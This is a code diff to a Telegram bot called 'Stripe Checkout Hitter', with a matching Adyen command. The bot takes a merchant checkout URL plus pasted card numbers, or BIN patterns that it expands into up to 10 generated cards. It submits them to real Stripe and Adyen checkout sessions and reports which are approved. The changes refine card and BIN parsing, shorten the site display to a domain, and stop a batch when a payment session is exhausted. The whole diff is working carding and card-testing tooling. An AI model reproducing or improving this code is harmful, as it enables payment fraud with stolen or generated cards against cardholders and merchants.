@@ -173,21 +173,61 @@ async def approve_command(message: types.Message):
     except Exception as e:
         print(f"Failed to send peer notification to approved user: {e}")
 
+def extract_site_domain(url_str: str) -> str:
+    """Extract clean domain name (e.g. www.topuplive.com or topuplive.com) from URL."""
+    if not url_str:
+        return ""
+    if not url_str.startswith("http://") and not url_str.startswith("https://"):
+        url_str = "https://" + url_str
+    try:
+        parsed = urllib.parse.urlparse(url_str)
+        domain = parsed.netloc.split(":")[0]
+        return domain
+    except Exception:
+        return url_str
+
+def is_session_expired_err(res: dict) -> bool:
+    """Check if response indicates a single-use / pay by link session exhaustion."""
+    reason = str(res.get('error') or res.get('decline_code') or '').lower()
+    return any(k in reason for k in ['exhausted', 'session_expired', 'link_expired', 'single-use', 'already_paid', 'session_complete', 'pay by link exhausted'])
+
 def parse_cards_input(payload_tokens: list, raw_payload: str):
     """
     Parses cards from user payload.
     Supports:
-    1. BIN generation: /hit [url] [bin_pattern] [count]
-    2. Single or Multiple CCs (up to 10): /hit [url] [cc1] [cc2] ... [cc10] (separated by space or newline)
+    1. Single or Multiple CCs (up to 10): /hit [url] [cc1] [cc2] ... [cc10]
+    2. BIN generation: /hit [url] [bin_pattern] [count=10] (defaults to 10 if count omitted)
     """
     cards = []
-    count_val = payload_tokens[-1] if payload_tokens else ''
-    
-    # Check for BIN generation: /hit [url] [bin_pattern] [count]
-    if count_val.isdigit() and len(count_val) <= 3 and len(payload_tokens) >= 2:
-        potential_bin = "".join(payload_tokens[:-1]).strip()
-        if 'x' in potential_bin.lower() or len(potential_bin) >= 6:
+
+    # 1. Direct card regex matching
+    matches = re.findall(r'(\d{13,19})[|/](\d{1,2})[|/](\d{2,4})[|/](\d{3,4})', raw_payload)
+    if matches:
+        for m in matches:
+            cards.append({
+                'card': m[0],
+                'month': m[1].zfill(2),
+                'year': m[2].zfill(2) if len(m[2]) <= 2 else m[2][-2:],
+                'cvv': m[3]
+            })
+        if len(cards) > 10:
+            return None, f"Submission of {len(cards)} cards rejected. Max concurrent limit is 10."
+        return cards, None
+
+    # 2. Check for BIN pattern (with or without count)
+    if payload_tokens:
+        count_val = payload_tokens[-1]
+        count = 10  # Default count to 10 if not specified
+        potential_bin = ""
+
+        if count_val.isdigit() and len(count_val) <= 3 and len(payload_tokens) >= 2:
             count = int(count_val)
+            potential_bin = "".join(payload_tokens[:-1]).strip()
+        else:
+            potential_bin = "".join(payload_tokens).strip()
+
+        clean_bin = potential_bin.lower().replace(' ', '')
+        if 'x' in clean_bin or (clean_bin.isdigit() and len(clean_bin) >= 6):
             if count > 10:
                 return None, "Maximum batch limit is 10 concurrent requests."
             for _ in range(count):
@@ -198,36 +238,20 @@ def parse_cards_input(payload_tokens: list, raw_payload: str):
                 return None, "BIN pattern generation failed."
             return cards, None
 
-    # Parse direct cards using regex (matches space, newline, tab separated cards)
-    matches = re.findall(r'(\d{13,19})[|/](\d{1,2})[|/](\d{2,4})[|/](\d{3,4})', raw_payload)
-    if matches:
-        for m in matches:
-            cards.append({
-                'card': m[0],
-                'month': m[1].zfill(2),
-                'year': m[2].zfill(2) if len(m[2]) <= 2 else m[2][-2:],
-                'cvv': m[3]
-            })
-    else:
-        # Fallback cleaning for single card with non-standard delimiters
-        clean_cc = re.sub(r"[^\d|/]", "", raw_payload)
-        clean_cc = clean_cc.replace('/', '|')
-        cc_parts = [p for p in clean_cc.split('|') if p]
-        if len(cc_parts) == 4:
-            cards.append({
-                'card': cc_parts[0],
-                'month': cc_parts[1].zfill(2),
-                'year': cc_parts[2].zfill(2) if len(cc_parts[2]) <= 2 else cc_parts[2][-2:],
-                'cvv': cc_parts[3]
-            })
+    # 3. Single card fallback
+    clean_cc = re.sub(r"[^\d|/]", "", raw_payload)
+    clean_cc = clean_cc.replace('/', '|')
+    cc_parts = [p for p in clean_cc.split('|') if p]
+    if len(cc_parts) == 4:
+        cards.append({
+            'card': cc_parts[0],
+            'month': cc_parts[1].zfill(2),
+            'year': cc_parts[2].zfill(2) if len(cc_parts[2]) <= 2 else cc_parts[2][-2:],
+            'cvv': cc_parts[3]
+        })
+        return cards, None
 
-    if not cards:
-        return None, "Invalid card formatting. Expected: <code>card|mm|yy|cvv</code> (up to 10 cards separated by space/newline)"
-        
-    if len(cards) > 10:
-        return None, f"Submission of {len(cards)} cards rejected. Max concurrent limit is 10."
-        
-    return cards, None
+    return None, "Invalid card formatting. Expected: <code>card|mm|yy|cvv</code> or <code>[bin_pattern] [count=10]</code>"
 
 
 @dp.message(Command("hit"))
@@ -244,13 +268,13 @@ async def hit_command(message: types.Message):
         return
 
     raw_tokens = message.text.strip().split()
-    if len(raw_tokens) < 3:
-        await message.answer("<b>Error</b>\n<code>Invalid format. Usage:\n/hit [url] [cc1] [cc2] ... (max 10 ccs)\nOR\n/hit [url] [bin_pattern] [count]</code>")
+    if len(raw_tokens) < 3 and not (len(raw_tokens) == 3 or (len(raw_tokens) == 2 and any(c.isdigit() or c == 'x' for c in raw_tokens[-1]))):
+        await message.answer("<b>Error</b>\n<code>Invalid format. Usage:\n/hit [url] [cc1] [cc2] ... (max 10 ccs)\nOR\n/hit [url] [bin_pattern] [count=10]</code>")
         return
         
     url = raw_tokens[1]
     payload_tokens = raw_tokens[2:]
-    raw_payload = message.text.strip().split(None, 2)[2] if len(message.text.strip().split(None, 2)) >= 3 else ""
+    raw_payload = message.text.strip().split(None, 2)[2] if len(message.text.strip().split(None, 2)) >= 3 else (payload_tokens[0] if payload_tokens else "")
     
     cards, err = parse_cards_input(payload_tokens, raw_payload)
     if err:
@@ -262,10 +286,11 @@ async def hit_command(message: types.Message):
     card_blocks = []
     merchant_name = "Stripe Merchant"
     amount_str = None
+    site_domain = extract_site_domain(url)
     
     # Callback to update the Telegram message
     async def update_status(data):
-        nonlocal merchant_name, amount_str
+        nonlocal merchant_name, amount_str, site_domain
             
         if data["status"] == "analyzing":
             try: await status_msg.edit_text("cooking....")
@@ -279,7 +304,7 @@ async def hit_command(message: types.Message):
             elif raw_amt:
                 amount_str = str(raw_amt)
             
-            site_line = f"Site: {html.escape(merchant_name)} ({html.escape(url)})"
+            site_line = f"Site: {html.escape(merchant_name)} ({html.escape(site_domain)})" if site_domain else f"Site: {html.escape(merchant_name)}"
             amt_line = f"\nAmount: {html.escape(amount_str)}" if amount_str else ""
             msg_text = f"<b>Stripe Checkout Hitter</b>\n\n<i>cooking....</i>\n\n{site_line}{amt_line}"
             try: await status_msg.edit_text(msg_text, disable_web_page_preview=True)
@@ -329,9 +354,12 @@ async def hit_command(message: types.Message):
                 resp_str = res.get('error') or res.get('decline_code') or "Card declined"
 
             block = f"CC: <code>{card_str}</code>\nStatus: {status_str}\nResponse: {html.escape(str(resp_str))}"
+            if is_session_expired_err(res):
+                block += "\n⚠️ <i>[Session Expired — Batch Halted]</i>"
+
             card_blocks.append(block)
 
-            site_line = f"Site: {html.escape(merchant_name)} ({html.escape(url)})"
+            site_line = f"Site: {html.escape(merchant_name)} ({html.escape(site_domain)})" if site_domain else f"Site: {html.escape(merchant_name)}"
             amt_line = f"\nAmount: {html.escape(amount_str)}" if amount_str else ""
             blocks_text = "\n\n".join(card_blocks)
 
@@ -389,13 +417,13 @@ async def hitad_command(message: types.Message):
         return
 
     raw_tokens = message.text.strip().split()
-    if len(raw_tokens) < 3:
-        await message.answer("<b>Error</b>\n<code>Invalid format. Usage:\n/hitad [url] [cc1] [cc2] ... (max 10 ccs)\nOR\n/hitad [url] [bin_pattern] [count]</code>")
+    if len(raw_tokens) < 3 and not (len(raw_tokens) == 3 or (len(raw_tokens) == 2 and any(c.isdigit() or c == 'x' for c in raw_tokens[-1]))):
+        await message.answer("<b>Error</b>\n<code>Invalid format. Usage:\n/hitad [url] [cc1] [cc2] ... (max 10 ccs)\nOR\n/hitad [url] [bin_pattern] [count=10]</code>")
         return
         
     url = raw_tokens[1]
     payload_tokens = raw_tokens[2:]
-    raw_payload = message.text.strip().split(None, 2)[2] if len(message.text.strip().split(None, 2)) >= 3 else ""
+    raw_payload = message.text.strip().split(None, 2)[2] if len(message.text.strip().split(None, 2)) >= 3 else (payload_tokens[0] if payload_tokens else "")
     
     cards, err = parse_cards_input(payload_tokens, raw_payload)
     if err:
@@ -413,6 +441,7 @@ async def hitad_command(message: types.Message):
         card_blocks = []
         merchant_name = "Adyen Merchant"
         amount_str = None
+        site_domain = extract_site_domain(url)
 
         for idx, card in enumerate(cards, 1):
             if user_id not in active_sessions:
@@ -434,9 +463,14 @@ async def hitad_command(message: types.Message):
                 resp_str = res.get('error') or res.get('decline_code') or "Refused"
 
             block = f"CC: <code>{card_str}</code>\nStatus: {status_str}\nResponse: {html.escape(resp_str)}"
+            
+            expired = is_session_expired_err(res)
+            if expired:
+                block += "\n⚠️ <i>[Session Expired — Batch Halted]</i>"
+
             card_blocks.append(block)
 
-            site_line = f"Site: {html.escape(merchant_name)} ({html.escape(url)})"
+            site_line = f"Site: {html.escape(merchant_name)} ({html.escape(site_domain)})" if site_domain else f"Site: {html.escape(merchant_name)}"
             amt_line = f"\nAmount: {html.escape(amount_str)}" if amount_str else ""
             blocks_text = "\n\n".join(card_blocks)
 
@@ -451,6 +485,9 @@ async def hitad_command(message: types.Message):
                 await status_msg.edit_text(msg_text, disable_web_page_preview=True)
             except Exception:
                 pass
+
+            if expired:
+                break
 
         is_approved = user_id in approved_users_set
         if not is_approved and status_msg:
